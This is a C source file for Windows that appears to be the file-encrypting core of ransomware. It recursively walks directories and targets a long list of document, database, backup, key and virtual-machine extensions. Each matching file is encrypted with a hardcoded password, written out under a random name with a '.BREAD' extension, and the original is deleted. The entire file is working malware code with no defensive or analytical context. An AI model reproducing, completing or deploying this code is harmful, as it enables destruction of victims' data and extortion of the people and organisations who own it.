#include "Crypto.h"


struct directory* make_node() {
	struct directory* node = malloc(sizeof(struct directory));
	node->directoryName = malloc(sizeof(WCHAR) * 260);
	ZeroMemory(node->directoryName, sizeof(WCHAR) * 260);
	node->Next = NULL;
	return node;
}

void randomStrGenerator(WCHAR rand_str[]) {

	LPCWSTR char1[] = { L"a",L"b",L"c",L"d",L"e",L"f",L"g",L"h",L"i",L"j",L"k",L"l",L"m",L"n",L"o",L"p",L"q",L"r",L"s",L"t",L"u",L"v",L"w",L"x",L"y",L"z",
					L"A",L"B",L"C",L"D",L"E",L"F",L"G",L"H",L"I",L"J",L"K",L"L",L"M",L"N",L"O",L"P",L"Q",L"R",L"S",L"T",L"U",L"V",L"W",L"X",L"Y",L"Z",
					L"1",L"2",L"3",L"4",L"5",L"6",L"7",L"8",L"9",L"0" };
	WCHAR tmp_str[40] = { 0 };
	for (int i = 0; i < 24; i++) {
		lstrcatW(tmp_str, char1[rand() % (sizeof(char1) / sizeof(LPCWSTR))]);
		//rand_str[i] = char1[rand() % (sizeof(char1) - 1)];
	}
	//rand_str[23] = '\0';

	WCHAR extension[] = { '.','B','R','E','A','D',0x0 };
	lstrcatW(rand_str, tmp_str);
	lstrcatW(rand_str, extension);

	return rand_str;
}

void encryptDirectory(const WCHAR directory_path[]) {
	
	//create new variable to hold the directory place to interact with files.
	WCHAR tmpDirectory[260] = { 0 };
	
	//give the directory the wild card expression to select all sub files.
	lstrcatW(tmpDirectory, directory_path);
	lstrcatW(tmpDirectory, L"\\*");
	
	//create needed variables.
	WIN32_FIND_DATAW fileData = { 0 };
	HANDLE fileHandle = NULL;

	//grab handle to the first file in the directory.
	fileHandle = FindFirstFileW(tmpDirectory, &fileData);
	if (fileHandle != INVALID_HANDLE_VALUE) {

		struct directory* headDir = make_node();
		struct directory* currNode = NULL;
		currNode = headDir;
		do {

			WCHAR tmp2Directory[260] = { 0 };
			WCHAR tmp3Directory[260] = { 0 };
			if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if ((!lstrcmpW(fileData.cFileName, L".")) || (!lstrcmpW(fileData.cFileName, L".."))) {
					continue;
				}

				lstrcatW(tmp2Directory, directory_path);
				lstrcatW(tmp2Directory, L"\\");
				lstrcatW(tmp2Directory, fileData.cFileName);

				lstrcpyW(currNode->directoryName, tmp2Directory);
				currNode->Next = make_node();
				currNode = currNode->Next;
				continue;
			}
			lstrcatW(tmp2Directory, directory_path);
			lstrcatW(tmp2Directory, L"\\");
			lstrcatW(tmp2Directory, fileData.cFileName);



			WCHAR rand_str[31] = { 0 };
			randomStrGenerator(rand_str);

			lstrcatW(tmp3Directory, directory_path);
			lstrcatW(tmp3Directory, L"\\");
			lstrcatW(tmp3Directory, rand_str);

			encryptFile(tmp2Directory, tmp3Directory, L"P4ssw0rd");
			DeleteFile(tmp2Directory);
			//wprintf(L"%s\n", tmp2Directory);

		} while (FindNextFileW(fileHandle, &fileData));

		FindClose(fileHandle);

		currNode = headDir;
		while (currNode->Next != NULL) {
			encryptDirectory(currNode->directoryName);
			currNode = currNode->Next;
		}
	}
}

DWORD encryptFile(LPCWSTR sourceFile, LPCWSTR destFile, LPCWSTR password) {

	LPCWSTR extensions[] = {
		L".3DM", L".3DS", L".602", L".7Z", L".ACCDB", L".AI", L".ARC", L".ASC", L".ASM", L".ASP",
		L".ASPX", L".BACKUP", L".BAK", L".BAT", L".BMP", L".BRD",L".BZ",L".BZ2",L".C",L".CGM"
		L".CLASS", L".CMD", L".CONFIG", L".CPP", L".CRT", L".CS", L".CSR", L".CSV", L".DB", L".DBF",
		L".DCH", L".DER", L".DIF", L".DIP", L".DJVU", L".SH", L".DOC", L".DOCB", L".DOCM", L".DOCX",
		L".DOT", L".DOTM", L".DOTX", L".DWG", L".EDB", L".EML", L".FRM", L".GIF", L".GO",
		L".GZ", L".H", L".HDD", L".HTM", L".HTML", L".HWP", L".IBD", L".INC", L".INI", L".ISO",
		L".JAR", L".JAVA", L".JPEG", L".JPG", L".JS", L".JSP", L".KDBX", L".KEY", L".LAY",
		L".LAY6", L".LDF", L".LOG", L".MAX", L".MDB", L".MDF", L".MML", L".MSG", L".MYD", L".MYI",
		L".NEF", L".NVRAM", L".ODB", L".ODG", L".ODP", L".ODS", L".ODT", L".OGG", L".ONETOC2", L".OST",
		L".OTG", L".OTP", L".OTS", L".OTT", L".P12", L".PAQ", L".PAS", L".PDF", L".PEM", L".PFX",
		L".PHP", L".PHP3", L".PHP4", L".PHP5", L".PHP6", L".PHP7", L".PHPS", L".PHTML", L".PL", L".PNG",
		L".POT", L".POTM", L".POTX", L".PPAM", L".PPK", L".PPS", L".PPSM", L".PPSX",L".PPT",L".PPTM",
		L".PPTX",L".PS1",L".PSD", L".PST", L".PY", L".RAR", L".RAW", L".RB", L".RTF", L".SAV",
		L".SCH", L".SHTML", L".SLDM", L".SLDX", L".SLK", L".SLN", L".SNT", L".SQ3", L".SQL", L".SQLITE3",
		L".SQLITEDB", L".STC", L".STD", L".STI", L".STW", L".SUO", L".SVG", L".SXC", L".SXD", L".SXI",
		L".SXM", L".SXW", L".TAR", L".TBK", L".TGZ", L".TIF", L".TIFF", L".TXT", L".UOP", L".UOT",
		L".VB", L".VBS", L".VCD", L".VDI", L".VHD", L".VMDK", L".VMEM", L".VMSD", L".VMSN", L".VMSS",
		L".VMTM", L".VMTX", L".VMX", L".VMXF", L".VSD", L".VSDX", L".VSWP", L".WAR", L".WB2", L".WK1",
		L".WKS", L".XHTML", L".XLC", L".XLM", L".XLS", L".XLSB", L".XLSM", L".XLSX", L".XLT", L".XLTM",
		L".XLTX", L".XLW", L".YML", L".ZIP"
	};


	BOOL fReturn = FALSE;
	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestinationFile = INVALID_HANDLE_VALUE;

	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hCryptKey = NULL;
	HCRYPTKEY hXchgKey = NULL;
	HCRYPTHASH hHash = NULL;

	PBYTE pbKeyBlob = NULL;
	DWORD dwKeyBlobLen;
	

	PBYTE pbBuffer = NULL;
	DWORD dwBlockLen;
	DWORD dwBufferLen;
	DWORD dwCount;

	DWORD extensionArrLen = sizeof(extensions) / sizeof(LPCWSTR);
	for (int i = 0; i < extensionArrLen; i++) {
		WCHAR* srcExtension = (WCHAR*)sourceFile + lstrlenW(sourceFile) - lstrlenW(extensions[i]);
		if (0 == lstrcmpiW(srcExtension, extensions[i])) {
			//if the extension matches one of the ones in our array continue to encrypt. Otherwise, skip over it.

			hSourceFile = CreateFile(sourceFile, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			hDestinationFile = CreateFileW(destFile, FILE_WRITE_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (!hSourceFile) {
				exit(-12);
			}
			if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0)) {
				exit(-13);
			}
			if (!password || !password[0]) {
				if (!CryptGenKey(hCryptProv, ENCRYPT_ALGORITHM, KEYLENGTH | CRYPT_EXPORTABLE, &hCryptKey)) {
					exit(-14);
				}
				if (!CryptGetUserKey(hCryptProv, AT_KEYEXCHANGE, &hXchgKey)) {
					if (NTE_NO_KEY == GetLastError()) {
						if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE, &hXchgKey))
							exit(-14);
					}
				}
				if (!CryptExportKey(hCryptKey, hXchgKey, SIMPLEBLOB, 0, NULL, &dwKeyBlobLen)) {
					exit(-15);
				}
				pbKeyBlob = (BYTE*)malloc(dwKeyBlobLen);
				if (!CryptExportKey(hCryptKey, hXchgKey, SIMPLEBLOB, 0, pbKeyBlob, &dwKeyBlobLen)) {
					exit(-16);
				}
				if (hXchgKey) {
					if (!CryptDestroyKey(hXchgKey)) {
						exit(-17);
					}
					hXchgKey = 0;
				}
				if (!WriteFile(hDestinationFile, &dwKeyBlobLen, sizeof(DWORD), &dwCount, NULL)) {
					exit(-18);
				}
				if (!WriteFile(hDestinationFile, pbKeyBlob, dwKeyBlobLen, &dwCount, NULL)) {
					exit(-18);
				}
				free(pbKeyBlob);
			}
			
			else {
				if (!CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash)) {
					exit(-19);
				}
				if (!CryptHashData(hHash, (BYTE*)password, lstrlenW(password), 0)) {
					exit(-20);
				}
				if (!CryptDeriveKey(hCryptProv, ENCRYPT_ALGORITHM, hHash, KEYLENGTH, &hCryptKey)) {
					exit(-21);
				}
				dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;
				if (ENCRYPT_BLOCK_SIZE > 1) {
					dwBufferLen = dwBlockLen + ENCRYPT_BLOCK_SIZE;
				}
				else {
					dwBufferLen = dwBlockLen;
				}

				pbBuffer = (BYTE*)malloc(dwBufferLen);
				if (!pbBuffer) {
					exit(-22);
				}
				BOOL fEOF = FALSE;
				do
				{
					if (!ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL))
					{
						exit(-23);
					}
					if(dwCount < dwBlockLen)
					{
						fEOF = TRUE;
					}
					if (!CryptEncrypt(hCryptKey, NULL, fEOF, 0, pbBuffer, &dwCount, dwBufferLen))
					{
						exit(-24);
					}
					if (!WriteFile(hDestinationFile, pbBuffer, dwCount, &dwCount, NULL))
					{
						exit(-25);
					}
				} while (!fEOF);

				fReturn = TRUE;
				if (hSourceFile)
					CloseHandle(hSourceFile);
				if (hDestinationFile)
					CloseHandle(hDestinationFile);
				if (pbBuffer)
					free(pbBuffer);
				if (hHash)
					CryptDestroyHash(hHash);
				if (hCryptKey)
					CryptDestroyKey(hCryptKey);
				if (hCryptProv)
					CryptReleaseContext(hCryptProv, 0);

				return fReturn;
			}
		}
	}

	
}
 